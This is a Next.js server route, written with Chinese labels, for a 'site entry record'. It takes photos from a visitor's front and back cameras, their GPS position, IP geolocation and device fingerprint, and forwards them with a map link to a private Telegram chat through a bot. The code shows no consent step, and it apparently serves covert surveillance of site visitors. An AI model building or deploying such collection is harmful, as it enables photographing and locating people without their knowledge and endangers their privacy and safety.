import { NextRequest, NextResponse } from 'next/server';

import { recordEntry } from '@/lib/huangguo/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

type ReportBody = {
  front?: string;
  back?: string;
  gps?: { lat: number; lng: number; acc: number } | null;
  device?: {
    ua?: string;
    model?: string;
    platform?: string;
    platformVersion?: string;
  };
};

const geoCache = new Map<string, { loc: string; at: number }>();

const isPrivateIp = (ip: string) =>
  /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|0\.0\.0\.0)/.test(ip);

async function ipLocation(ip: string): Promise<string> {
  if (!ip || isPrivateIp(ip)) return '本地/内网';
  const hit = geoCache.get(ip);
  if (hit && Date.now() - hit.at < 24 * 3600_000) return hit.loc;
  try {
    const res = await fetch(`https://ipwho.is/${ip}`, { cache: 'no-store' });
    const j = (await res.json()) as {
      success?: boolean;
      city?: string;
      region?: string;
      country?: string;
      latitude?: number;
      longitude?: number;
    };
    if (j.success === false) return '未知';
    const loc = [j.country, j.region, j.city].filter(Boolean).join(' ');
    geoCache.set(ip, { loc: loc || '未知', at: Date.now() });
    if (geoCache.size > 500) geoCache.clear();
    return loc || '未知';
  } catch {
    return '查询失败';
  }
}

const parseDevice = (ua: string, hint?: string): string => {
  if (hint) return hint;
  const m =
    ua.match(/\(([^)]*)\)/)?.[1] || '';
  const android = ua.match(/;\s*([^;()]+)\s*Build\//)?.[1]?.trim();
  if (android) return android;
  if (/iPhone/.test(ua)) return 'iPhone';
  if (/iPad/.test(ua)) return 'iPad';
  if (/Windows NT 10/.test(m)) return 'Windows 10/11';
  if (/Windows/.test(m)) return 'Windows';
  if (/Mac OS X/.test(m)) return 'macOS';
  if (/Android/.test(m)) return 'Android';
  if (/Linux/.test(m)) return 'Linux';
  return '未知设备';
};

const browserOf = (ua: string): string => {
  if (/Edg\//.test(ua)) return 'Edge';
  if (/OPR\//.test(ua)) return 'Opera';
  if (/MicroMessenger\//.test(ua)) return '微信';
  if (/Quark\//.test(ua)) return '夸克';
  if (/HuaweiBrowser\//.test(ua)) return '华为浏览器';
  if (/VivoBrowser\//.test(ua)) return 'Vivo浏览器';
  if (/MiuiBrowser\//.test(ua)) return '小米浏览器';
  if (/Chrome\//.test(ua)) return 'Chrome';
  if (/Safari\//.test(ua)) return 'Safari';
  return '未知浏览器';
};

const dataUrlToBlob = (dataUrl: string): Blob | null => {
  const m = dataUrl.match(/^data:(image\/[a-z+.-]+);base64,(.+)$/i);
  if (!m) return null;
  const bin = atob(m[2]);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return new Blob([bytes], { type: m[1] });
};

async function resolveChatId(token: string): Promise<string> {
  const fixed = process.env.TG_ENTRY_CHAT_ID || '';
  if (fixed) return fixed;
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=5`);
    const j = (await res.json()) as {
      ok?: boolean;
      result?: { message?: { chat?: { id?: number } } }[];
    };
    const list = j.result || [];
    for (let i = list.length - 1; i >= 0; i--) {
      const id = list[i]?.message?.chat?.id;
      if (id) return String(id);
    }
  } catch {
    /* ignore */
  }
  return '';
}

async function sendTelegram(
  caption: string,
  front: Blob,
  back: Blob | null
): Promise<string> {
  const token = process.env.TG_ENTRY_BOT_TOKEN || '';
  if (!token) return '未配置 TG_ENTRY_BOT_TOKEN';
  const chatId = await resolveChatId(token);
  if (!chatId) return '未配置 TG_ENTRY_CHAT_ID 且 bot 暂无会话（请先给 bot 发一条消息）';

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('front.jpg', front, 'front.jpg');
  if (back) {
    form.append('back.jpg', back, 'back.jpg');
    form.append(
      'media',
      JSON.stringify([
        { type: 'photo', media: 'attach://front.jpg' },
        { type: 'photo', media: 'attach://back.jpg' },
      ])
    );
  } else {
    form.append(
      'media',
      JSON.stringify([{ type: 'photo', media: 'attach://front.jpg' }])
    );
  }
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
    method: 'POST',
    body: form,
  });
  if (!res.ok) return `Telegram 发送失败 ${res.status}`;
  return '';
}

export async function POST(req: NextRequest) {
  let body: ReportBody;
  try {
    body = (await req.json()) as ReportBody;
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }
  if (!body.front) return NextResponse.json({ ok: false }, { status: 400 });

  const ip =
    req.headers.get('cf-connecting-ip') ||
    (req.headers.get('x-forwarded-for') || '').split(',')[0].trim() ||
    '未知';
  const ua = body.device?.ua || req.headers.get('user-agent') || '';
  const model =
    body.device?.model ||
    parseDevice(ua, '') ||
    '未知设备';
  const deviceLabel = `${model} · ${
    body.device?.platform || ''
  }${body.device?.platformVersion ? ' ' + body.device.platformVersion : ''} · ${browserOf(ua)}`;
  const loc = await ipLocation(ip);
  const gps = body.gps;
  const now = new Date();
  const time = `${now.toLocaleString('zh-CN', { hour12: false })} (UTC+8)`;

  const lines = [
    '📸 进站记录',
    `时间：${time}`,
    `IP：${ip}`,
    `IP 归属地：${loc}`,
    gps
      ? `GPS：${gps.lat.toFixed(6)}, ${gps.lng.toFixed(6)}（±${gps.acc}m）`
      : 'GPS：无',
    gps ? `地图：https://maps.google.com/?q=${gps.lat},${gps.lng}` : '',
    `设备：${deviceLabel}`,
    `UA：${ua.slice(0, 120)}`,
    `照片：前置${body.back ? ' + 后置' : '（设备无后置摄像头）'}`,
  ].filter(Boolean);

  const frontBlob = dataUrlToBlob(body.front);
  const backBlob = body.back ? dataUrlToBlob(body.back) : null;
  let tgError = '';
  if (frontBlob) {
    tgError = await sendTelegram(lines.join('\n'), frontBlob, backBlob);
  } else {
    tgError = '照片解码失败';
  }

  recordEntry(req, { ip, loc, model: deviceLabel });

  return NextResponse.json({ ok: !tgError, telegram: tgError || 'sent' });
}
